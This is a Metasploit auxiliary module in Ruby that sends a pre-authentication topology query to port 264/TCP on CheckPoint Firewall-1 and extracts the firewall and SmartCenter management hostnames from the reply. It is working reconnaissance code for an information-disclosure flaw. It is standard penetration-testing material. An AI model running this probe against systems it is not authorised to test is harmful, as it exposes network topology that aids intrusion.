##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'CheckPoint Firewall-1 SecuRemote Topology Service Hostname Disclosure',
			'Description'    => %q{
				This module sends a query to the port 264/TCP on CheckPoint Firewall-1
				firewalls to obtain the firewall name and management station
				(such as SmartCenter) name via a pre-authentication topology request.
				Note that the SecuriTeam reference listed here is not the same vulnerabilty, but it
				does discus the same protocol and is somewhat related to this information
				disclosure.
			},
			'Author'         => [ 'patrick' ],
			'DisclosureDate' => 'Dec 14 2011', # Looks like this module is first real reference
			'References'     =>
				[
					# patrickw - None? Stumbled across, probably an old bug/feature but unsure.
					[ 'URL', 'http://www.osisecurity.com.au/advisories/' ], # Advisory coming soon, placeholder
					[ 'URL', 'http://www.securiteam.com/securitynews/5HP0D2A4UC.html' ] # Related-ish
				]
		))

		register_options(
			[
				Opt::RPORT(264),
			], self.class)
	end

	def autofilter
		false
	end

	def run
		print_status("Attempting to contact Checkpoint FW1 SecuRemote Topology service...")
		fw_hostname = nil
		sc_hostname = nil

		connect

		sock.put("\x51\x00\x00\x00")
		sock.put("\x00\x00\x00\x21")
		res = sock.get_once(4)
		if (res == "Y\x00\x00\x00")
			print_good("Appears to be a CheckPoint Firewall...")
			sock.put("\x00\x00\x00\x0bsecuremote\x00")
			res = sock.get_once
			if (res =~ /CN=(.+),O=(.+)\./i)
				fw_hostname = $1
				sc_hostname = $2
				print_good("Firewall Host: #{fw_hostname}")
				print_good("SmartCenter Host: #{sc_hostname}")
			end
		else
			print_error("Unexpected response: '#{res.inspect}'")
		end

		report_info(fw_hostname,sc_hostname)

		disconnect
	end

	# Only trust that it's real if we have a hostname. If you get a funny
	# response, it might not be what we think it is.
	def report_info(fw_hostname,sc_hostname)
		return unless fw_hostname
		host_info = {
			:host => datastore['RHOST'],
			:os_name => "Checkpoint Firewall-1",
			:purpose => "firewall"
		}
		host_info[:name] = fw_hostname
		host_info[:info] = "SmartCenter Host: #{sc_hostname}" if sc_hostname
		report_host(host_info)
		svc_info = {
			:host => datastore['RHOST'],
			:port => datastore['RPORT'],
			:proto => "tcp",
			:name => "securemote"
		}
		report_service(svc_info)
	end

end
